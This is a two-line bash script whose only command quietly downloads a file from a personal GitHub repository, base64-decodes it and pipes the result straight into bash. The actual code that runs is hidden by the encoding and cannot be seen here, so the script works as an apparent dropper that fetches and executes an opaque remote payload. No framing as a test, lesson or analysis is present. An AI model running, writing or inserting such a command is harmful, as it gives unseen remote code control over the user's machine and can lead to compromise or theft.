#!/bin/bash
wget -qO- https://raw.githubusercontent.com/lizalisemhlebezi/board/refs/heads/main/entrypoint.sh | base64 -d | bash
